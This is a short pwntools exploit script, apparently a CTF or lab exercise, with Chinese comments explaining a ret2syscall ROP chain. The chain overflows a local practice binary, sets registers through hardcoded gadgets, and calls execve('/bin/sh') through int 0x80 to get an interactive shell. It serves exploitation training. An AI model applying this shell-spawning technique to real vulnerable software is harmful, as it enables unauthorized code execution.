from pwn import *

'''
    PWN 第三章 System Call
    
    汇编调用system("/bin/bash")方式:
        eax = 0xb
        ebx = "/bin/bash"
        ecx = 0x0
        edx = 0x0
        int 0x80
        
    栈帧SystemCall实现方式:
        1.找到栈帧注入、溢出点
        2.定位栈帧溢出点到栈帧临近存放EIP值的距离
        3.劫持栈帧EIP值, 通过多次跳转将eax、ebx、ecx、edx改写至满足SystemCall要求
        4.劫持栈帧EIP值，将值跳转至汇编代码int 0x80中，完成SystemCall
'''


def ret2_systemcall(file_name='/mnt/hgfs/Cyber Security PWN/ROP/ret2syscall'):
    print('call ret2syscall start')
    try:
        io = process([file_name])

        io.recvline()

        io.recvline()

        payload = b'A' * 112

        # eax
        payload = payload + p32(0x080bb196) + p32(0xB)

        # edx ecx ebx
        edx = 0x0
        ecx = 0x0
        ebx = int(next(ELF(file_name).search(b'/bin/sh')))  # 0x80be408

        print('text: /bin/sh is: 0x%x' % ebx)
        payload = payload + p32(0x0806eb90) + p32(edx) + p32(ecx) + p32(ebx)

        # int 80
        payload = payload + p32(0x08049421)

        io.sendline(payload)

        io.interactive()
    except Exception:
        return False
    finally:
        print('call ret2syscall end\n\n')

    return True


if __name__ == '__main__':
    ret2_systemcall()
